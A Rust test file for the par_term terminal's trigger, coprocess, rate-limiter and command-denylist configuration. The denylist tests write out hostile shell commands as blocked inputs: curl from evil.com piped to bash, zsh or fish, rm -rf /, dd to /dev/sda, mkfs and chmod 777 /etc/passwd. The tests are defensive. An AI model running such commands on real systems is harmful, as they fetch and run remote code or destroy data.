use par_term::config::automation::PrettifyScope;
use par_term::config::{
    Config, CoprocessDefConfig, RestartPolicy, TriggerActionConfig, TriggerConfig,
    TriggerRateLimiter, check_command_denylist,
};

#[test]
fn test_default_config_has_empty_triggers_and_coprocesses() {
    let config = Config::default();
    assert!(config.triggers.is_empty());
    assert!(config.coprocesses.is_empty());
}

#[test]
fn test_trigger_config_yaml_roundtrip() {
    let trigger = TriggerConfig {
        name: "error-detect".to_string(),
        pattern: r"ERROR:\s+(.+)".to_string(),
        enabled: true,
        actions: vec![
            TriggerActionConfig::Highlight {
                fg: Some([255, 0, 0]),
                bg: None,
                duration_ms: 5000,
            },
            TriggerActionConfig::Notify {
                title: "Error!".to_string(),
                message: "Found an error".to_string(),
            },
        ],
        require_user_action: true,
    };

    let yaml = serde_yml::to_string(&trigger).unwrap();
    let deserialized: TriggerConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(trigger, deserialized);
}

#[test]
fn test_trigger_config_disabled() {
    let yaml = r#"
name: test
pattern: "foo"
enabled: false
actions: []
"#;
    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
    assert!(!trigger.enabled);
}

#[test]
fn test_trigger_config_defaults() {
    // enabled defaults to true, actions defaults to empty
    let yaml = r#"
name: test
pattern: "foo"
"#;
    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
    assert!(trigger.enabled);
    assert!(trigger.actions.is_empty());
}

#[test]
fn test_all_trigger_action_variants_serialize_deserialize() {
    let actions = vec![
        TriggerActionConfig::Highlight {
            fg: Some([255, 0, 0]),
            bg: None,
            duration_ms: 5000,
        },
        TriggerActionConfig::Notify {
            title: "t".into(),
            message: "m".into(),
        },
        TriggerActionConfig::MarkLine {
            label: Some("mark".into()),
            color: None,
        },
        TriggerActionConfig::SetVariable {
            name: "n".into(),
            value: "v".into(),
        },
        TriggerActionConfig::RunCommand {
            command: "echo".into(),
            args: vec!["hi".into()],
        },
        TriggerActionConfig::PlaySound {
            sound_id: "bell".into(),
            volume: 80,
        },
        TriggerActionConfig::SendText {
            text: "hello".into(),
            delay_ms: 100,
        },
        TriggerActionConfig::Prettify {
            format: "json".into(),
            scope: PrettifyScope::CommandOutput,
            block_end: None,
            sub_format: None,
            command_filter: None,
        },
    ];

    for action in &actions {
        let yaml = serde_yml::to_string(action).unwrap();
        let deserialized: TriggerActionConfig = serde_yml::from_str(&yaml).unwrap();
        assert_eq!(action, &deserialized);
    }
}

#[test]
fn test_trigger_action_highlight_defaults() {
    let yaml = r#"
type: highlight
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    assert_eq!(
        action,
        TriggerActionConfig::Highlight {
            fg: None,
            bg: None,
            duration_ms: 5000,
        }
    );
}

#[test]
fn test_trigger_action_play_sound_defaults() {
    let yaml = r#"
type: play_sound
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    assert_eq!(
        action,
        TriggerActionConfig::PlaySound {
            sound_id: String::new(),
            volume: 50,
        }
    );
}

#[test]
fn test_trigger_action_to_core_action_highlight() {
    use par_term_emu_core_rust::terminal::TriggerAction;

    let config_action = TriggerActionConfig::Highlight {
        fg: Some([255, 0, 0]),
        bg: Some([0, 255, 0]),
        duration_ms: 3000,
    };
    let core_action = config_action.to_core_action();
    assert_eq!(
        core_action,
        TriggerAction::Highlight {
            fg: Some((255, 0, 0)),
            bg: Some((0, 255, 0)),
            duration_ms: 3000,
        }
    );
}

#[test]
fn test_trigger_action_to_core_action_all_variants() {
    use par_term_emu_core_rust::terminal::TriggerAction;

    let pairs: Vec<(TriggerActionConfig, TriggerAction)> = vec![
        (
            TriggerActionConfig::Notify {
                title: "t".into(),
                message: "m".into(),
            },
            TriggerAction::Notify {
                title: "t".into(),
                message: "m".into(),
            },
        ),
        (
            TriggerActionConfig::MarkLine {
                label: Some("L".into()),
                color: None,
            },
            TriggerAction::MarkLine {
                label: Some("L".into()),
                color: None,
            },
        ),
        (
            TriggerActionConfig::SetVariable {
                name: "n".into(),
                value: "v".into(),
            },
            TriggerAction::SetVariable {
                name: "n".into(),
                value: "v".into(),
            },
        ),
        (
            TriggerActionConfig::RunCommand {
                command: "echo".into(),
                args: vec!["hi".into()],
            },
            TriggerAction::RunCommand {
                command: "echo".into(),
                args: vec!["hi".into()],
            },
        ),
        (
            TriggerActionConfig::PlaySound {
                sound_id: "bell".into(),
                volume: 80,
            },
            TriggerAction::PlaySound {
                sound_id: "bell".into(),
                volume: 80,
            },
        ),
        (
            TriggerActionConfig::SendText {
                text: "hello".into(),
                delay_ms: 100,
            },
            TriggerAction::SendText {
                text: "hello".into(),
                delay_ms: 100,
            },
        ),
    ];

    for (config_action, expected_core) in pairs {
        let core = config_action.to_core_action();
        assert_eq!(core, expected_core);
    }
}

#[test]
fn test_coprocess_def_config_yaml_roundtrip() {
    let coproc = CoprocessDefConfig {
        name: "logger".to_string(),
        command: "/usr/bin/tee".to_string(),
        args: vec!["/tmp/log.txt".to_string()],
        auto_start: true,
        copy_terminal_output: true,
        restart_policy: RestartPolicy::Never,
        restart_delay_ms: 0,
    };

    let yaml = serde_yml::to_string(&coproc).unwrap();
    let deserialized: CoprocessDefConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(coproc, deserialized);
}

#[test]
fn test_coprocess_def_config_defaults() {
    let yaml = r#"
name: test
command: /bin/cat
"#;
    let coproc: CoprocessDefConfig = serde_yml::from_str(yaml).unwrap();
    assert_eq!(coproc.name, "test");
    assert_eq!(coproc.command, "/bin/cat");
    assert!(coproc.args.is_empty());
    assert!(!coproc.auto_start);
    assert!(coproc.copy_terminal_output); // defaults to true
    assert_eq!(coproc.restart_policy, RestartPolicy::Never); // defaults to Never
    assert_eq!(coproc.restart_delay_ms, 0); // defaults to 0
}

#[test]
#[allow(clippy::field_reassign_with_default)]
fn test_config_with_triggers_and_coprocesses_yaml_roundtrip() {
    let mut config = Config::default();
    config.triggers = vec![TriggerConfig {
        name: "error".to_string(),
        pattern: "ERROR".to_string(),
        enabled: true,
        actions: vec![TriggerActionConfig::Highlight {
            fg: Some([255, 0, 0]),
            bg: None,
            duration_ms: 5000,
        }],
        require_user_action: true,
    }];
    config.coprocesses = vec![CoprocessDefConfig {
        name: "logger".to_string(),
        command: "/usr/bin/tee".to_string(),
        args: vec!["/tmp/log.txt".to_string()],
        auto_start: false,
        copy_terminal_output: true,
        restart_policy: RestartPolicy::Never,
        restart_delay_ms: 0,
    }];

    let yaml = serde_yml::to_string(&config).unwrap();
    let deserialized: Config = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(config.triggers, deserialized.triggers);
    assert_eq!(config.coprocesses, deserialized.coprocesses);
}

#[test]
fn test_prettify_action_yaml_roundtrip() {
    let action = TriggerActionConfig::Prettify {
        format: "markdown".into(),
        scope: PrettifyScope::Block,
        block_end: Some(r"^```$".into()),
        sub_format: Some("plantuml".into()),
        command_filter: Some(r"^myapi\s+".into()),
    };

    let yaml = serde_yml::to_string(&action).unwrap();
    let deserialized: TriggerActionConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(action, deserialized);
}

#[test]
fn test_prettify_action_defaults() {
    let yaml = r#"
type: prettify
format: json
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    assert_eq!(
        action,
        TriggerActionConfig::Prettify {
            format: "json".into(),
            scope: PrettifyScope::CommandOutput, // default
            block_end: None,
            sub_format: None,
            command_filter: None,
        }
    );
}

#[test]
fn test_prettify_scope_deserialization() {
    // Line scope
    let yaml = r#"
type: prettify
format: json
scope: line
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    match action {
        TriggerActionConfig::Prettify { scope, .. } => assert_eq!(scope, PrettifyScope::Line),
        _ => panic!("expected Prettify"),
    }

    // Block scope
    let yaml = r#"
type: prettify
format: json
scope: block
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    match action {
        TriggerActionConfig::Prettify { scope, .. } => assert_eq!(scope, PrettifyScope::Block),
        _ => panic!("expected Prettify"),
    }

    // CommandOutput scope
    let yaml = r#"
type: prettify
format: json
scope: command_output
"#;
    let action: TriggerActionConfig = serde_yml::from_str(yaml).unwrap();
    match action {
        TriggerActionConfig::Prettify { scope, .. } => {
            assert_eq!(scope, PrettifyScope::CommandOutput);
        }
        _ => panic!("expected Prettify"),
    }
}

#[test]
fn test_prettify_to_core_action_relays_through_mark_line() {
    use par_term::config::automation::PRETTIFY_RELAY_PREFIX;
    use par_term_emu_core_rust::terminal::TriggerAction;

    let action = TriggerActionConfig::Prettify {
        format: "json".into(),
        scope: PrettifyScope::CommandOutput,
        block_end: None,
        sub_format: None,
        command_filter: Some(r"^myapi\s+".into()),
    };

    let core = action.to_core_action();

    // Should relay through MarkLine with __prettify__ label prefix.
    match core {
        TriggerAction::MarkLine { label, color } => {
            assert!(color.is_none());
            let lbl = label.expect("label should be set");
            assert!(
                lbl.starts_with(PRETTIFY_RELAY_PREFIX),
                "label should start with prettify prefix"
            );
            let json = lbl.strip_prefix(PRETTIFY_RELAY_PREFIX).unwrap();
            let payload: serde_json::Value = serde_json::from_str(json).unwrap();
            assert_eq!(payload["format"], "json");
            assert_eq!(payload["scope"], "command_output");
            assert_eq!(payload["command_filter"], r"^myapi\s+");
        }
        other => panic!("expected MarkLine relay, got {:?}", other),
    }
}

#[test]
fn test_prettify_none_format_serializes() {
    let action = TriggerActionConfig::Prettify {
        format: "none".into(),
        scope: PrettifyScope::CommandOutput,
        block_end: None,
        sub_format: None,
        command_filter: Some(r"^bat\s+".into()),
    };

    let yaml = serde_yml::to_string(&action).unwrap();
    let deserialized: TriggerActionConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(action, deserialized);

    match deserialized {
        TriggerActionConfig::Prettify { format, .. } => assert_eq!(format, "none"),
        _ => panic!("expected Prettify"),
    }
}

#[test]
fn test_trigger_with_prettify_action_roundtrip() {
    let trigger = TriggerConfig {
        name: "Prettify myapi output".to_string(),
        pattern: r#"^\{"api_version":"#.to_string(),
        enabled: true,
        actions: vec![TriggerActionConfig::Prettify {
            format: "json".into(),
            scope: PrettifyScope::CommandOutput,
            block_end: None,
            sub_format: None,
            command_filter: None,
        }],
        require_user_action: true,
    };

    let yaml = serde_yml::to_string(&trigger).unwrap();
    let deserialized: TriggerConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(trigger, deserialized);
}

// ============================================================================
// Trigger Security Tests
// ============================================================================

#[test]
fn test_require_user_action_defaults_to_true() {
    // When not specified in YAML, require_user_action defaults to true (safe)
    let yaml = r#"
name: test
pattern: "foo"
actions:
  - type: run_command
    command: echo
    args: ["hello"]
"#;
    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
    assert!(
        trigger.require_user_action,
        "require_user_action should default to true for safety"
    );
}

#[test]
fn test_require_user_action_explicit_false() {
    let yaml = r#"
name: test
pattern: "foo"
require_user_action: false
actions:
  - type: run_command
    command: echo
    args: ["hello"]
"#;
    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
    assert!(
        !trigger.require_user_action,
        "require_user_action should be false when explicitly set"
    );
}

#[test]
fn test_require_user_action_roundtrip() {
    let trigger = TriggerConfig {
        name: "test".to_string(),
        pattern: "foo".to_string(),
        enabled: true,
        actions: vec![TriggerActionConfig::RunCommand {
            command: "echo".into(),
            args: vec!["hello".into()],
        }],
        require_user_action: false,
    };

    let yaml = serde_yml::to_string(&trigger).unwrap();
    let deserialized: TriggerConfig = serde_yml::from_str(&yaml).unwrap();
    assert_eq!(trigger, deserialized);
    assert!(!deserialized.require_user_action);
}

#[test]
fn test_is_dangerous_run_command() {
    let action = TriggerActionConfig::RunCommand {
        command: "echo".into(),
        args: vec![],
    };
    assert!(action.is_dangerous(), "RunCommand should be dangerous");
}

#[test]
fn test_is_dangerous_send_text() {
    let action = TriggerActionConfig::SendText {
        text: "hello".into(),
        delay_ms: 0,
    };
    assert!(action.is_dangerous(), "SendText should be dangerous");
}

#[test]
fn test_is_not_dangerous_highlight() {
    let action = TriggerActionConfig::Highlight {
        fg: None,
        bg: None,
        duration_ms: 5000,
    };
    assert!(!action.is_dangerous(), "Highlight should not be dangerous");
}

#[test]
fn test_is_not_dangerous_notify() {
    let action = TriggerActionConfig::Notify {
        title: "t".into(),
        message: "m".into(),
    };
    assert!(!action.is_dangerous(), "Notify should not be dangerous");
}

#[test]
fn test_is_not_dangerous_mark_line() {
    let action = TriggerActionConfig::MarkLine {
        label: None,
        color: None,
    };
    assert!(!action.is_dangerous(), "MarkLine should not be dangerous");
}

#[test]
fn test_is_not_dangerous_set_variable() {
    let action = TriggerActionConfig::SetVariable {
        name: "n".into(),
        value: "v".into(),
    };
    assert!(
        !action.is_dangerous(),
        "SetVariable should not be dangerous"
    );
}

#[test]
fn test_is_not_dangerous_play_sound() {
    let action = TriggerActionConfig::PlaySound {
        sound_id: "bell".into(),
        volume: 50,
    };
    assert!(!action.is_dangerous(), "PlaySound should not be dangerous");
}

#[test]
fn test_is_not_dangerous_prettify() {
    let action = TriggerActionConfig::Prettify {
        format: "json".into(),
        scope: PrettifyScope::CommandOutput,
        block_end: None,
        sub_format: None,
        command_filter: None,
    };
    assert!(!action.is_dangerous(), "Prettify should not be dangerous");
}

// ============================================================================
// Command Denylist Tests
// ============================================================================

#[test]
fn test_denylist_blocks_rm_rf_root() {
    let result = check_command_denylist("rm", &["-rf".into(), "/".into()]);
    assert!(result.is_some(), "rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_rm_rf_home() {
    let result = check_command_denylist("rm", &["-rf".into(), "~".into()]);
    assert!(result.is_some(), "rm -rf ~ should be denied");
}

#[test]
fn test_denylist_blocks_curl_pipe_bash() {
    // Direct pipe-to-shell pattern in a single command argument
    let result = check_command_denylist("bash", &["-c".into(), "curl http://evil.com|bash".into()]);
    assert!(result.is_some(), "curl|bash in args should be denied");

    // Also catches the spaced variant
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | bash".into()]);
    assert!(result.is_some(), "curl | bash in args should be denied");
}

#[test]
fn test_denylist_blocks_eval() {
    let result = check_command_denylist("eval", &["malicious_code".into()]);
    assert!(result.is_some(), "eval should be denied");
}

#[test]
fn test_denylist_blocks_exec() {
    let result = check_command_denylist("exec", &["/bin/sh".into()]);
    assert!(result.is_some(), "exec should be denied");
}

#[test]
fn test_denylist_blocks_chmod_777() {
    let result = check_command_denylist("chmod", &["777".into(), "/etc/passwd".into()]);
    assert!(result.is_some(), "chmod 777 should be denied");
}

#[test]
fn test_denylist_blocks_mkfs() {
    let result = check_command_denylist("mkfs.ext4", &["/dev/sda1".into()]);
    assert!(result.is_some(), "mkfs should be denied");
}

#[test]
fn test_denylist_allows_safe_commands() {
    let result = check_command_denylist("echo", &["hello".into()]);
    assert!(result.is_none(), "echo should be allowed");
}

#[test]
fn test_denylist_allows_notify_send() {
    let result = check_command_denylist("notify-send", &["Build completed".into()]);
    assert!(result.is_none(), "notify-send should be allowed");
}

#[test]
fn test_denylist_allows_cat() {
    let result = check_command_denylist("cat", &["/tmp/output.txt".into()]);
    assert!(result.is_none(), "cat should be allowed");
}

#[test]
fn test_denylist_case_insensitive() {
    let result = check_command_denylist("EVAL", &["something".into()]);
    assert!(
        result.is_some(),
        "denylist check should be case-insensitive"
    );
}

#[test]
fn test_denylist_blocks_dd() {
    let result = check_command_denylist("dd", &["if=/dev/zero".into(), "of=/dev/sda".into()]);
    assert!(result.is_some(), "dd if= should be denied");
}

#[test]
fn test_denylist_blocks_sh_c_wrapper() {
    // sh -c with dangerous payload should be denied via wrapper detection
    let result = check_command_denylist("sh", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "sh -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_bash_c_wrapper() {
    let result = check_command_denylist("bash", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "bash -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_zsh_c_wrapper() {
    let result = check_command_denylist("zsh", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "zsh -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_env_rm_rf() {
    // /usr/bin/env rm -rf / should be caught: env wrapper stripped, then rm -rf / matches
    let result = check_command_denylist("/usr/bin/env", &["rm".into(), "-rf".into(), "/".into()]);
    assert!(result.is_some(), "/usr/bin/env rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_env_wrapper_simple() {
    // env <cmd> — the env wrapper itself should be stripped and the remainder re-checked
    let result = check_command_denylist("env", &["rm".into(), "-rf".into(), "/".into()]);
    assert!(result.is_some(), "env rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_pipe_to_zsh() {
    // curl output piped to zsh should be denied
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | zsh".into()]);
    assert!(result.is_some(), "curl | zsh in args should be denied");
}

#[test]
fn test_denylist_blocks_pipe_to_fish() {
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | fish".into()]);
    assert!(result.is_some(), "curl | fish in args should be denied");
}

// ============================================================================
// Rate Limiter Tests
// ============================================================================

#[test]
fn test_rate_limiter_allows_first_call() {
    let mut limiter = TriggerRateLimiter::default();
    assert!(limiter.check_and_update(1), "First call should be allowed");
}

#[test]
fn test_rate_limiter_blocks_immediate_second_call() {
    let mut limiter = TriggerRateLimiter::default();
    limiter.check_and_update(1);
    assert!(
        !limiter.check_and_update(1),
        "Immediate second call should be blocked"
    );
}

#[test]
fn test_rate_limiter_allows_different_trigger_ids() {
    let mut limiter = TriggerRateLimiter::default();
    assert!(limiter.check_and_update(1), "Trigger 1 first call");
    assert!(
        limiter.check_and_update(2),
        "Trigger 2 should be independent"
    );
}

#[test]
fn test_rate_limiter_custom_interval() {
    // Use a very short interval for testing
    let mut limiter = TriggerRateLimiter::new(1);
    limiter.check_and_update(1);
    // Sleep just past the interval
    std::thread::sleep(std::time::Duration::from_millis(5));
    assert!(
        limiter.check_and_update(1),
        "Should be allowed after interval passes"
    );
}

#[test]
fn test_rate_limiter_cleanup() {
    let mut limiter = TriggerRateLimiter::new(1);
    limiter.check_and_update(1);
    limiter.check_and_update(2);

    // Wait a bit, then cleanup with a very short max_age
    std::thread::sleep(std::time::Duration::from_millis(5));
    limiter.cleanup(0); // max_age_secs = 0 should clear everything

    // After cleanup, both should be allowed again
    assert!(
        limiter.check_and_update(1),
        "Should be allowed after cleanup"
    );
    assert!(
        limiter.check_and_update(2),
        "Should be allowed after cleanup"
    );
}

// ============================================================================
// Backward Compatibility Tests
// ============================================================================

#[test]
fn test_existing_config_without_require_user_action_gets_safe_default() {
    // Simulate an existing config YAML that doesn't have require_user_action
    let yaml = r#"
name: old-trigger
pattern: "error"
enabled: true
actions:
  - type: run_command
    command: notify-send
    args: ["Error detected"]
"#;
    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
    assert!(
        trigger.require_user_action,
        "Existing configs without require_user_action should get the safe default (true)"
    );
}

#[test]
fn test_trigger_with_only_safe_actions_not_affected() {
    // Triggers that only have safe actions (Highlight, Notify, etc.) are not affected
    // by require_user_action at all
    let trigger = TriggerConfig {
        name: "safe-trigger".to_string(),
        pattern: "ERROR".to_string(),
        enabled: true,
        actions: vec![
            TriggerActionConfig::Highlight {
                fg: Some([255, 0, 0]),
                bg: None,
                duration_ms: 5000,
            },
            TriggerActionConfig::Notify {
                title: "Error".into(),
                message: "Found error".into(),
            },
            TriggerActionConfig::MarkLine {
                label: Some("error".into()),
                color: Some([255, 0, 0]),
            },
        ],
        require_user_action: true,
    };

    // None of these actions are dangerous
    assert!(!trigger.actions.iter().any(|a| a.is_dangerous()));
}
